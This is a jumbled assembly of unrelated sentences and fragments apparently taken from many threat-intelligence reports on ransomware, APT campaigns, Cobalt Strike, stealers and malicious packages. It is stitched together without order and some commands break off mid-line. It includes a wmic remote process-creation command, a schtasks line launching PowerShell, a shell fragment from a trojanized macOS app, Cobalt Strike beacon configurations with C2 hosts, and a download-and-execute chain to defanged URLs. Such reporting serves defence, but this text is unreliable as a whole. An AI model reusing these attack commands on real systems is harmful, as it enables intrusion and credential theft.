Figure 58.
This is the first time we’ve observed this tool.
This “fileless” backdoor methodology made the identification of the backdoor much more difficult using standard host analysis techniques. 
The goal is to send host info to the loader C2, then to gate the bot download.
This is likely done as a method to avoid detection from Log Analysis Engines, such as the Sagan Engine, as well as other monitoring services such as Microsoft's Defender or Sentinel. 
The following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS: Ransomware Towards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain.
In the last six months, however, ReversingLabs and others have observed a marked increase in the volume of malware published to PyPI.
;T1087.002 Account Discovery: Domain Account; ;T1482 Domain Trust Discovery;To obtain information about domain trust, the attackers used the ADRecon tool. ;T1046 Network Service Scanning;To scan the target network, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1135 Network Share Discovery;To search for network shares, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1016 System Network Configuration Discovery;For network reconnaissance, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1082 System Information Discovery;BlackCat uses wmic to obtain the UUID of the compromised host. 
This targeting is consistent with the previous wave of cyberattacks affecting the Albanian government during the July 2022 wave of cyberattacks. 
[S]&cd&echo
The registry key names are hardcoded into every FOCUSFJORD sample, as the malware needs to read and decrypt those registry key values for proper execution. 
What sets RapperBot apart from other worms is its “intelligent” way of brute forcing: it checks the prompt and, based on the prompt, it selects the appropriate credentials.
Post()-
+----------------------+-----------------------+ | C2 Server | URI queried | 
It’s also notable that the icon does have the little arrow in the bottom left corner that indicates it is a Shortcut, and not a document.
Method = "POST"; $req.
Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or developing cluster of threat activity, allowing Microsoft to track it as a unique set of information until we can reach high confidence about the origin or identity of the actor behind the activity.
Four protocols are supported: Standard TCP connection Application-level messages are sent unchanged as TCP segments. 
T1003.001 Discovery Incident #1 Conducting discovery indirectly via schedule tasks named “Windows Update” performing remote directory listings. 
As a consequence, when the WMI service was initiated, the rogue version of this DLL forced the loading of a StealthVector image named wmiwk.dll. 
By removing the THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER flag before the ZwCreateThreadEx call and using memory breakpoints, the shellcode can be debugged in the usual manner when the thread resumes execution. 
It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.
= – ⟨M1⟩ ⋅
MyResume.pdf, as viewed in Adobe Acrobat ReaderCompared to the PL shellcode, the data structure is more complex and contains the following: 
This bot ID format is similar to that generated by Lizar, which also used a checksum of system information, combined with the process ID.
/password:<readcted_password> process call create "cmd /c ping -n 1 -a <redacted_internal_ip4> >$temp\a.tmp wmic /node:<redacted_internal_ip2> /user:<redacted_group>\<redacted_user>
SonicWall Capture Labs provides protection against this threat via the SonicWall Capture ATP w/RTDMI. 
Fig.6 Dll loading by encrypted payload Second Stage Analysis The embedded DLL will mainly try to fetch malicious “ico” files from the GitHub Repository “https://raw[.]githubusercontent[.]com/IconStorages/images/main/icon%d[.]ico”.
As seen with other ransomware families, BlackCat operates with a RaaS model and utilizes multiple extortion techniques, then publishes a leak site to further pressure victims into paying the ransom. 
These show that they are sophisticated and meticulous actors. Figure 17.
The threat group, Cobalt Gang (also known as TEMP.Metastrike), is suspected to be engaging in attacks against financial organizations in several countries.
In Figure 9 above, the function we’ve renamed as func_ScanScreen() is the one responsible for this screen capture capability.
These functions are called from the injector to prepare and load a .NET assembly payload from the IronPython script into a remote process. 
Details of the unzipped file, a 7-zip standalone console, are shown in Figure 14.
Even though a new set of commands has been added to the PoS version, we could find some of those from the ATM attack still being used.
Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as using 7-Zip, RAR, ZIP, or zlib.
These rules did not fire due to the absence of an SSH header in the traffic.
Unit 42 researchers have found several malicious IronPython scripts whose purpose is to load and run Turla’s malware tools on a victim’s system.
The actor used a domain owned and operated by the Myanmar government, the Myanmar Digital News network, as a domain front for their beacons. 
.pkg .pl .png 
Its primary objective is to download, deobfuscate, decompress, and launch the secondary stage payload.
An example of such a server_config is shown in Figure 12.
It is expected that the different naming schemes are related to the different variations of the ransomware.
TDS 4.2 & 5.0 Login Packet used by the ModScan module, dissected using Wireshark Downloadable module: ProcList 
DNS is a fundamental component of the internet infrastructure, as any communication must start with a DNS name resolution.
T1021.002 Remote Services: SMB/Windows Admin Shares SMB shares have been used by Vice Society for lateral movement. 
In addition, for customers of Sophos MDR, the MDR Detection Engineering team has a variety of behavioral detections in place that will detect follow up activity. 
SpoofingDNS spoofing occurs when threat actors alter the legitimate DNS server records to redirect users to fraudulent websites instead of their intended destination.
These authentications would typically occur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controller or other infrastructure server?
This domain resolves to the IP address 162.0.209[.]27, which has hosted domains that have been attributed to Kimsuky in previous research, such as sesorin[.]lol and rfa[.]ink.
On different debugging sessions the virtual addressing changed during analysis. 
The payload connects to one of the C2 servers, downloads an infostealer and starts it. 
Enable continuous access evaluation Continuous access evaluation (CAE) revokes access in real time when changes in user conditions trigger risks, such as when a user is terminated or moves to an untrusted location. 
[T1552.003].
The targeting of LATAM government entities could represent an initial shift away from internal cybercriminal policies on the targeting of governments worldwide.
But we want more.
These emails, with the subject line “[Sending Finalized Text] G7+Partners FASS Meeting,” are distributed to multiple employees within government entities across G20 countries, as shown in the figure below. 
Overview 
This practice is known as triple extortion, a tactic observed in groups like BlackCat, Avaddon and SunCrypt in the past. 
/TN test2 /SC MINUTE /MO 45 /TR "powershell \"$r=[System.
Companies can also benefit from the use of multilayered detection and response solutions such as Trend Micro Vision One:trade_mark:, which provides powerful XDR capabilities that collect and automatically correlate data across multiple security layers — email, endpoints, servers, cloud workloads, and networks — to prevent attacks via automated protection, while also ensuring that no significant incidents go unnoticed.
The following week on April 12, 2023, yet another North American organization contacted Sophos for assistance. 
However, detailed analysis of the shellcode demonstrates that the samples actually belong to the Crosswalk malware family.
The actors’ malware can create local user accounts. 
See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable. 
title: Enigma Stealer Targets Cryptocurrency Industry with Fake Jobs url: https://www.trendmicro.com/en_us/research/23/b/enigma-stealer-targets-cryptocurrency-industry-with-fake-jobs.html Malware Enigma Stealer Targets Cryptocurrency Industry with Fake Jobs We discovered an active campaign targeting Eastern Europeans in the cryptocurrency industry using fake job lures. 
Camaro Dragon overlaps with previously reported activities conducted by state-sponsored Chinese threat actors, namely Mustang Panda.
Below are some of the Cobalt Strike C2 servers that we observed during intrusions.
These phishing websites contain fake installers, luring users into downloading and installing the malware. 
In the domain environment, these credentials can be used by attackers to pivot to other systems in the network.
.js 
Cloning of git repositories and extraction of sensitive API Keys.
Due to the subdirectories that are named after the FQDNs for victim domains, CrowdStrike assesses with moderate confidence that the scripts represent an AD enumeration tool used by the adversary. 
Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation of Remote Services [T1210] Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).
During our investigation we were able to see file activity dating back to February 3, 2023.
The database backup identified both the user of the SBS 1 administrator account (USER 2) and the user’s workstation (Workstation 4), which the MDM software remotely administered. 
While the tool can be used for legitimate purposes, it is also used by criminals to spy on their victims. 
" Although many old signatures are decommissioned or otherwise suppressed, Quadrant leaves some rules in place as "hunting" rules.
See KB87073 for details. 
In the investigations Mandiant has conducted, it appeared that APT29 deployed POSHSPY as a secondary backdoor for use if they lost access to their primary backdoors. 
cmd.exe /C dsquery subnet -limit 0 Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.)
Some Windows and MacOS versions of the application have been abused by the threat actor to add an installer that communicates with various command-and-control (C2) servers. 
<?xml version="1.0" encoding="UTF-16"?> <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"> <RegistrationInfo> <URI>\{3A79715D-4FFB-50BE-8F3A-090CE7FB4097}</URI> </RegistrationInfo> <Triggers> <TimeTrigger id="TimeTrigger"> <Repetition> <Interval>PT1H</Interval> <StopAtDurationEnd>false</StopAtDurationEnd> </Repetition> <StartBoundary>2012-01-01T12:00:00</StartBoundary> <Enabled>true</Enabled> </TimeTrigger> <LogonTrigger id="LogonTrigger"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> 
The link file downloads and executes hxxp://[redacted].67[.]12:222/xa[.]hta xa[.]hta downloads and executes hxxp://[redacted].67[.]12:222/qDxcmqPPmI[.]wsf qDxcmqPPmI.wsf was not available at the time of the investigation.
Trigona’s ransom notes are unique; rather than the usual text file, they are instead presented in an HTML Application with embedded JavaScript containing unique computer IDs (CID) and victim IDs (VID). 
[D3-FAPA] Isolate: Execution Isolation Executable Allowlisting
In addition to the Python program, we observed a .NET loader that can extract EvilExtractor.
[T1562.001] by modifying Group Policy Objects
Instrumentation;The attackers may use wmic to obtain information and run various commands, including to delete Volume Shadow Copies.
id:
In order to accomplish this, Kimsuky distributes an email that lure targeted individuals to log in to a spoofed NK News subscription service.
Figure 2.
The operating method and the code used in the DLL described in the article are very similar to our analysis and observations. 
It is also signed with the same certificate as the downloader.
Public scanning interfaces, such as Microsoft Defender External Attack Surface Management, can be used to improve data. 
This alert is generated when a successful sign-in from an IP address that had been identified as participating in password spray was observed. 
Microsoft assesses that MERCURY likely worked in partnership with another actor that Microsoft tracks as DEV-1084, who carried out the destructive actions after MERCURY’s successful operations had gained access to the target environment. 
CollectionT1056.001Input Capture: KeyloggingFatalRAT has keylogger functionalities. 
Empty open directory that hosted 2022%20tax_documents[.]zip 
[T1590] Tactics: Resource Development [TA0042] Table II:
Ensure that User-ID is only enabled for internal trusted interfaces Define at least one 'Include Network'. 
Version numbers indicate that the malware undergoes frequent changes and maybe supported by a team of developers.
== 0x00004550 and ( all of them and ( pe.imports("clfsw32.dll","CreateLogMarshallingArea") and pe.imports("kernel32.dll", "VirtualProtect") and pe.imports("ktmw32.dll", "CreateTransaction") and pe.imports("kernel32.dll", "CreateFileTransactedA") ) ) } rule HUNTING_Win_PRIVATELOG_2_notstrict { meta: author = "adrien.bataille@mandiant.com" description = "Detects possible PRIVATELOG and STASHLOG variants based on strings or imports.
Authors Earle Maui Earnshaw Threats Analyst Nathaniel Morales Threat Analyst Katherine Casona Threat Analyst Don Ovid Ladores Threats Analyst 
Encrypted Channel Uses Qakbot primarily and Cobalt Strike. 
Financially Motivated Campaign Leverages CMD-Based Scripts and LOLBaS for Online Banking Theft in Portugal, Peru, and Mexico url: https://blogs.blackberry.com/en/2023/05/cmdstealer-targets-portugal-peru-and-mexico Operation CMDStealer:
The activity can be correlated against the Application log for MSI installer events (Event ID 1033). 
OpenSource Gh0st RAT Still Haunting Inboxes 15 Years After Release
Additionally, it’s important to note that the usage of Ngrok in conjunction with MaccaroniC2 tool may result in the violation of the terms of service or policies of certain platforms.
[DS0017]. Detection:
Sandals: Igniting the Fantasy (wiper) 
As with any detection approach and security tool, there are limitations.
Unit 42 incident responders have also assisted clients with response efforts in several Ransom Cartel cases. 
Stage 2 embedded binary files Name MD5 SHA-1 SHA-256 iQVW64.SYS (CVE-2015-2291) Vulnerable Intel driver, used for kernel exploitation 1898ceda3247213c084f43637ef163b3 d04e5db5b6c848a29732bfd52029001f23c3da75 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b Driver.
Ursnif disables SPDY and HTTP/2 (successor of SPDY protocol) on the infected host.
For an attacker to exploit this vulnerability, they just have to replace the “ServiceManager.exe” file from the driver folder with a malicious file to trick the driver into running the tainted file and executing with higher SYSTEM privileges following a reboot.
Additionally, Rorschach appears to have taken some of the ‘best’ features from some of the leading ransomwares leaked online, and integrated them all together.
Given previous target and TTP overlaps, and an evident familiarity with victim environments, we assess with medium-confidence that Gallium is involved.
Figure 4.
This information was used to update our detection content for GuLoader across our customers. 
Its value must contain correct first 16 characters used to decrypt BlackCat configuration data. 
title: BlueNoroff introduces new methods bypassing MoTW url: https://securelist.com/bluenoroff-methods-bypass-motw/108383/ BlueNoroff group is a financially motivated threat actor eager to profit from its cyberattack capabilities.
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4.
The names and content of the lure documents, the associated domains, and the use of Crimson RAT suggest that the activities discussed in this post are part of a previously reported broader targeting of the education sector by Transparent Tribe. 
The ransomware encrypts the victim's files using the ChaCha20 encryption algorithm and generates the encryption keys using a combination of Curve25519, an example of elliptic curve cryptography, and AES-128. 
When possible, segment critical information on air-gapped systems.
Ransom Cartel ransom notes.
T1346 Obtain/Re-use Payloads CISA has observed the threat actors use and reuse existing capabilities. 
Spearphishing Attachment [T1566.001] Phishing:
By doing so, Royal ransomware significantly increases the speed of its file encryption process. 
For more information on vulnerabilities routinely exploited by sophisticated cyber actors, see CISA Alert: Top 10 Routinely Exploited Vulnerabilities. 
FortiGuard Labs provides the Rapper.
Analysts can then use investigation and remediation tools in Microsoft Defender Endpoint to perform deep investigation and additional hunting. 
LockBit ransomware’s maldocs campaign, initially detected in 2022, had specifically targeted individuals in Korea.
It starts by locating and copying two specific file of Chrome profiles namely as “%userprofile%\Appdata\Local\Google\Chrome\User data\Local State” and “%userprofile%\Appdata\Local\Google\Chrome\User data\Default\Login Data” in the%temp% folder.
A summarized description of the version changes can be found in the Dolphin evolution section. 
Case Summary In this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware.
This directory contains two more files: the Winlogon Injector and the Trojan Loader.
Reflective loading, Mallox, and Fargo variants 
The result of this is that LAPSUS$ are less predictable which may be why they have seen recent success. 
Microsoft has started to enforce default search order on many of their applications, even if not universally.
Dropping a Rust executable and popping a fake message box The Rust executable then downloads the next stage—an Inno-Setup installer that deploys the PHP information stealer from <domain_name>/files?t=<theme_name>&tp=d. We’ve also spotted similar delivery methods that dropped Python executables compiled with Nuitka instead of Rust to drop the next stage Inno-Setup. 
Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [M1050]. 
The team moved laterally to an MDM server (MDM 1) at Site 3, searched files on the server, and found plaintext credentials [T1552.001] to an application programming interface (API) user account stored in PowerShell scripts.
title: Kimsuky Strikes Again | New Social Engineering Campaign Aims to Steal Credentials and Gather Strategic Intelligence url: https://www.sentinelone.com/labs/kimsuky-new-social-engineering-campaign-aims-to-steal-credentials-and-gather-strategic-intelligence/ Executive Summary SentinelLabs has been tracking a social engineering campaign by the North Korean APT group Kimsuky targeting experts in North Korean affairs, part of a broader campaign discussed in a recent NSA advisory. 
Figure 8: Inspector tool provided by PyPI security team 
TrailBlazer and GoldMax Throughout StellarParticle-related investigations, CrowdStrike has identified two sophisticated malware families that were placed on victim systems in the mid-2019 timeframe: a Linux variant of GoldMax and a completely new family CrowdStrike refers to as TrailBlazer. 
Aside from allowing command and control (C2) and data exfiltration opportunities for an attacker, there is also a latent risk of the software itself having vulnerabilities and being unpatched because it’s not being managed by IT. 
The first three IP addresses relate to the CS servers with which the Beacon communicated. 
INCIDENT RESPONSE If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC. 
The driver collects information about installed AV filters and writes it to the C:\Windows\System32\catroot2\edb.chk.log file. 
If big files need to be stored in the drive, and cannot use consecutive blocks, these files will have to be fragmented in the disk.
Initially, it is empty; the value is generated on the first execution using the following format: <prefix>_<current timestamp>_<machine hostname> 12345678910111213141516171819202122 server_config { product_name: “PCArrowI" product_version: "v5.0.2" id: "1202_[REDACTED]" root: "" file_server: "47.111.22[.]65" file_server_port: "80" file_server_bak: "" file_server_bak_port: "" exchange_server: "47.111.22[.]65" exchange_server_port: "81" exchange_server_bak: "" exchange_server_bak_port: "" file_server_key: "E\367\016\031<…>" xchg_server_key: "8\335\325$<…>" file_key: "U\267\323\353\<…>" 
Among those tasks is Background Inventory, which ultimately starts the malicious code. 
To move between the subnets, the team moved through DCs.
Organizations can also take the following actions to minimize the risk: Scan and monitor systems and firmware updates in order to detect affected Gigabyte systems and the backdoor-like tools embedded in firmware.
Want to stay ahead of the adversaries?
We are taking a full-scale response approach to ongoing cybersecurity threats by deploying countermeasures, such as: Implementing threat detections and leveraging BlueSteel, our machine-learning powered PowerShell classifier, to identify malicious command execution and ensuring that eSentire has visibility and detections are in place across eSentire MDR for Endpoint and MDR for Network. 
SHA1 SHA2561ce30fbd_dll.dll9ea0d4448472cdeeb290e8006e8b1e9b 30f71a24c15dd81965b12996a79d914acf4f169e 2cd1ca52a5d404176f0ec7debeceb4ba3c95b139061f86ac971195b02d854b0cMD5
The ‘Newsletter Software Supermailer’ application was likely registered by the actor to facilitate mass-mailing activity.
T1083
For instance, we will not see them in the imported function list, and they not even be part of the strings in the sample.
”This payload was found to create specially crafted Windows shortcut files that run during the startup process of a victims machine and force it to restart.
When a file has a low number of imports, it strongly indicates that it contains another component that is dropped/loaded.
Figure 1 – Rorschach’s High Level Execution Flow on both endpoints and on Domain Controllers. 
A breakdown of the observed IP’s and their ports can be found in the INDEX A below.
We recommend that our readers follow the best practices given below: Safety Measures Needed to Prevent Ransomware Attacks Conduct regular backup practices and keep those backups offline or in a separate network. 
Spike in LokiBot Activity During Final Week of 2022
To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 443, "Beacon Type": "8 (HTTPS)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "dimentos[.]com,/FAQ""Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 443, "Beacon Type": "8 (HTTPS)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "dimentos[.]com,/bg"Port 80:"Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 80, "Beacon Type": "0 (HTTP)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "192[.]99[.]178[.]145,/r-arrow""Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 80, "Beacon Type": "0 (HTTP)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "192[.]99[.]178[.]145,/bg" Machine beaconing out to Cobalt Strike using the above profile Persistence An account named “nuuser” was created by one of the Cobalt Strike Beacons.
Windows Command ShellThe malware updater uses cmd.exe to download files from Alibaba Cloud Object Storage Service. 
Vice Society ransom note using HelloKitty ransomware.
File enumeration The ransomware looks for available network shares for network encryption by listing accessible local IPs, then uses NetShareEnum and attempts to connect on ADMIN$ and IPC$ shares (Figure 6). 
Host: skolibri13.azureedge[.]net (actual C2) NGROK MD5: e3bc4dd84f7a24f24d790cc289e0a10f (legitimate NGROK renamed to conhost.exe) MD5: 84ed6012ec62b0bddcd18058a8ff7ddd (VirtualHost.vbs) UltraVNC IP/Port: 81.91.177[.]54:7234 (using legitimate ULTRAVNC 23b89bf2c2b99fbc1e232b4f86af65f4) BEACON Host: w2doger[.]xyz IP: 185.231.68.102 MD5: a9fa3eba3f644ba352462b904dfbcc1a (shellcode) 
This enables the attackers to keep updating their tools in order to find a way to circumvent the authorization policies, allowing them to perform their attacks. 
An example of spam email sent through the Exchange inbound connectorThe hyperlinked images within the spam messages implied to recipients that they were eligible for a prize.
The backups included the encryption key needed to decrypt any encrypted values, such as SSH passwords [T1552].
Interestingly, the driver installed is the same as the one for version 5.0.2.
Figure 5: Properties of the malicious MSI installer Figure 6: NovaPDF 11 components Figure 7: Decoy files The main malicious trigger for the MSI installer resides under CustomAction table.
Adobe Reader or a photo viewing program can’t open the file. 
TrailBlazer WMI Persistence In the obfuscated example above, TrailBlazer (<FILENAME>.exe) would be executed when the system’s uptime was between 180 and 480 seconds. 
Hide Artifacts: Hidden Window T1569.002 System Services: Service Execution T1573.002 Encrypted Channel:
Data is encrypted with the aforementioned file_key before being inserted into the database.
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc.
x64dbg – reliable and user-friendly.
In this case, any system that was booting and connected to the environment would receive the configuration changes, encrypted archive containing the ransomware, a decompression utility to extract the ransomware, configuration changes and the order to reboot and execute.
For example, we found a specific name “TaoZongjie” among the different malware samples we collected.
If a user clicks on the URL within the message, it will direct them to a decoy site.
At a high level, the relevant attack vectors include: Compromise in the supply chain Compromise in the local environment Malware persistence via functionality of this firmware in systems A more detailed analysis of these risks is provided with suggested mitigations below.
Notably, t00ls[.]com is a private forum that can only be accessed by individuals who possess invitation codes for the site. 
In victimology aspects, Earth Zhulong is consistent with the 1937CN group. 
We extracted it with pyinstxtractor and found that the “PYARMOR” string in its main code file “contain.pyc”, shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected.
It’s also possible to instrument and log calls to some of the higher level networking APIs, but again, this is also detectable in many cases and isn’t going to get us all encrypted communications. 
d801:d1df:1328:492a[:]d801:53 (UDP) a83f:8110:5067:d801:beac:bf78:cce1[:]d301:53 (UDP) Appendix 3: IOCs of Canopy Cooperation terms[.]xls MD5: b0ab12a5a4c232c902cdeba421872c37 SHA-1: a8e7659942cc19f422678181ee23297efa55fa09 SHA-256: 026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141 File type: MS Excel Spreadsheet File size: 247.00 KB (252928 bytes) IOCs 88.119.170[.]124:80 (TCP) ZaibCb15Ak[.]xls MD5: 6cef87a6ffb254bfeb61372d24e1970a SHA-1: e21d95b648944ad2287c6bc01fcc12b05530e455 SHA-256: 4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c File type: MS Excel Spreadsheet File size: 249.00 KB (254976 bytes) IOCs 5.199.133[.]149:80 (TCP) Appendix 4:IOCs of Mori FML[.]dll MD5: 0431445d6d6e5802c207c8bc6a6402ea SHA-1: 3765c1ad8a1d936aad88255aef5d6d4ce24f94e8 SHA-256: 3098dd53da40947a82e59265a47059e69b2925bc49c679e6555d102d1c6cbbc8 File type: Win32 DLL File size: 200.65 MB (210397496 bytes) 
It is either: downloaded from the C&C along with the ModScan module, or received during runtime, using the named pipe associated with the ModScan module. 
Evolving into PoS malware Prilex has evolved out of ATM-focused malware into modular point-of-sale malware targeting payment systems developed by Brazilian vendors, the so-called EFT/TEF software.
The attackers could have gained the information describing the implementation of the encryption and decryption mechanism from a 2016 data breach described in a blogpost by Brian Krebs. 
The earliest variant of ShellFang was observed in a victim’s environment in 2020.
DNS cache poisoning and spoofing are often used interchangeably in cybersecurity.
It combines the collective activities carried out by subgroups of advanced persistent threat (APT) group Earth Preta (also known as Mustang Panda), representing a comprehensive network of operations for gathering sensitive information from various entities.
EclecticIQ analysts identified a modified version of Cobalt Strike known as "Cobalt Strike Cat"[1].
[MITRE ATT&CK] Rootkit (T1014) |
LSASS Memory Discovery T1087 Account Discovery Discovery T1083 File and Directory Discovery Discovery T1057 Process Discovery Discovery T1049 System Network Connections Discovery Lateral Movement T1570 Lateral Tool Transfer Collection T1560.001 Archive Collected Data: Archive via Utility 28/09/2022 GTSC TEAM 
Malicious actors using this technique can effectively hide the real C&C server behind the protocol. 
Figure 6 Section 2 of GuLoader's first stage PowerShell. 
Figure 9: Screenshot of HTA displayed in a text editor. 
This technique enables the fully fileless loading and execution of a malicious image without invoking the standard Windows API, such as LoadLibrary.
>/dev/null 2>&1 ; pwd -P );BLOB_PATH="/tmp/._KbmflZqwXa";IMG_SP_PATH="/tmp/._bHOospjBUL";[ -f "$IMG_SP_PATH" ] && rm -rf "$IMG_SP_PATH";[ -d "$IMG_SP_PATH" ] && rm -rf "$IMG_SP_PATH";TMPDIR="$IMG_SP_PATH/Logic Pro X.app/Contents";mkdir -p
The below courses of action mitigate the following techniques: Process Discovery [T1057], File and Directory Discovery [T1083] CORTEX XDR PREVENT Configure Behavioral Threat Protection under the Malware Security Profile Lateral Movement 
Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory.
Ransom Cartel and REvil Code Comparison The Ransom Cartel samples analyzed revealed similarities with REvil ransomware. 
debjob /download
The network was configured not to allow any connection to the internet. 
As it turns out, the infostealer is not the only malicious payload deployed during the 3CX supply chain attack.
Figure 5: A Cyber AI Analyst Incident Event log showing AI Analyst autonomously pivoting off a breach of 'SaaS / Admin / OAuth Permission Grant' to uncover details of an account hijacking.
The fshec2 package uses a significantly different approach that doesn’t rely on obfuscation tools.
Further, the newly added secret was set to remain valid for more than a decade.
The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.
Masquerading: Match Legitimate Name or Location The threat actor renamed their utilities to masquerade as legitimate system binaries (AdFind as svchost.exe), match the system’s role (GoldMax), or appear legitimate (TrailBlazer as an apparent Adobe utility).
[D3-SPA] Process Lineage Analysis [D3-PLA] Valid Accounts
As a result, any threat actor can use this to persistently infect vulnerable systems either via MITM or compromised infrastructure. Risks and Impact These issues expose organizations to a wide range of risks and attack scenarios. 
From there, the threat actors began connecting to other hosts via RDP, including the a backup server.
It verifies that the file is suffixed by its SHA1 hash, and then generates the same 56-byte value using the stored GlobalAtom GUID string in memory. 
The main purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host.
Figure 29.
TA0011 Command and Control T1219.
TA00008 Lateral Movement T1021
This legitimate application drops the Inno-Setup installer that decompresses to a whole PHP application containing malicious scripts.
However, malware developers can add “dummy” imports to mislead researchers. 
Group 724 Group 724 is possibly related to Earth Preta.
The infostealer collects system information and browser history, then sends it to the C2 server. 
Conclusion In September 2020, the US Department of Justice released a series of indictments against members of the APT41 group, charging them with a high number of computer intrusions against a variety of targets, both in the private and public sectors, some of which included high-profile supply chain attacks.
Starting from the offset 0x80, there exists a long array of all the exfiltrated data. 
This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings. 
RokRAT campaigns typically begin with a phishing email with a ZIP file attachment, containing a LNK file disguised as a Word document.
To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats were used.
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\errorEE.aspx DLL: 
This can be especially effective if timed with deployments of patches that require a reboot, done at the beginning of the day or even remotely using Powershell's Stop-Computer cmdlet.
Shortcut filesRelative pathCommand line arguments_upyqta2_JAA.lnk..\..
Persistence is established at ProgramData\AvastSvcXXX, where "XXX" represents three random letters.
The usage of renamed AdFind is consistent with other industry reporting on this campaign. 
Group 724 also appears to be focused on compromising targets in specific industries and countries.
This loader then executes two more self-extracting archive executables that are responsible for decrypting a shellcode to load the Amadey Trojan and two instances of the RedLine Stealer malware onto the system.
As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.
In many cases, these cyber actors seek to exploit vulnerabilities in major applications, such as Pulse Secure, Apache, F5 Big-IP, and Microsoft products.
Harden: Software Update [D3-SU] Detect: Network Traffic Analysis Connection Attempt Analysis
13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here: https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf One of the observed commands invoked via WMI was ‘firefox.exe’. 
It also demands continuous research and adaptation as antivirus technologies evolve.
This time the adversary compresses the data as a gzipped tar-file: tar.gz.
ImpactT1485Data DestructionThe Fantasy wiper overwrites data in files and then deletes the files. 
It creates directory listings and exfiltrates files.
[D3-FAPA] System Call Analysis [D3-SCA] Isolate: Execution Isolation Hardware-based Process Isolation [D3-HBPI] Mandatory Access Control [D3-MAC] Tactics: Discovery [TA0007] Table IX: Chinese state-sponsored cyber actors’
title: Can You See It Now?
BAT.RDPEnable.
X-Force observed Dave-loaded Cobalt Strike samples using this watermark in suspected Royal attacks in fall 2022. 
Decoy site examples The following table shows a few examples of the decoy sites used in the campaigns we have observed. 
At the current publication of the article, a patch has not been developed or released. 
They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.
(2023.05.24.02) 
T1036.005
Also missing is the requirement to submit the key file in c\users\public\key.
In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes.
Thus, in order to find a collision, we can simply work in the scalar field and find a solution to the equation ⟨M1⟩
Note that this user is inserted using the following functionality. 
Some years ago, a threat actor using the moniker Eriknetwalker was advertising ransomware on several underground forums.
This technique was observed in the Commerce environment through a sharp incline of Kerberos requests using RC4 encryption.
Tune host-based products to detect anomalous binaries, lateral movement, and persistence techniques. 
Figure 13.
Every second, the orchestrator, which lives in memory only, reads the cleartext rsa.txt file to check whether there are new commands to execute.
The malware consists of a small persistence backdoor in the form of a DLL file named App_Web_logoimagehandler.ashx.b6031896.dll, which is programmed to allow remote code execution through SolarWinds web application server when installed in the folder “inetpub\SolarWinds\bin\”.
[HKEY_LOCAL_MACHINESOFTWARE$sxrconfig]). 
In 2022, the US Department of Treasury sanctioned elements of Mint Sandstorm for past cyberattacks citing sponsorship from the IRGC. 
When any new process starts in the system, SmadAV scans all available windows.
Monitor for unexpected processes interacting with LSASS.exe. 
Remcos is a tool for remote control and surveillance.
GPSQuasarRAT downloader. 
Utilise MFA for user authentication on both cloud and remote access solutions to help reduce the risk of unauthorised access.
When collecting data, we also analyzed additional threat intel data sources such as ThreatFox.
